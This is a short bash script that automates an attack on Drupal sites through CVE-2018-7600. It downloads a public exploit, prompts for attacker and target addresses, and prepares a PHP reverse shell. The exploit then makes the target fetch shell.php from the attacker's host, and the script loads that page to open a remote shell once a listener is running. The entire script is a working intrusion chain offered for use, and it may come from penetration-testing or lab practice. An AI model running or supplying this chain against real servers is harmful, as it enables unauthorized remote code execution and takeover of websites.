#!/bin/bash

wget https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py
echo "LHOST"
read LHOST
echo "RHOST"
read RHOST

cp "/usr/share/webshells/php/php-reverse-shell.php" .
sleep 2
mv php-reverse-shell.php shell.php
echo "PLEASE CHANGE LHOST IP TO YOUR LHOST IP IN SHELL.PHP, OPENING IN 7 SECONDS"
sleep 7
nano shell.php

echo "GOOD JOB!!! :)"
echo "Start a listener in another shell on port 1234"
read -p "press enter one done" answer

python drupa7-CVE-2018-7600.py -c "wget http://$LHOST/shell.php" http://$RHOST
firefox	http://$RHOST/shell.php
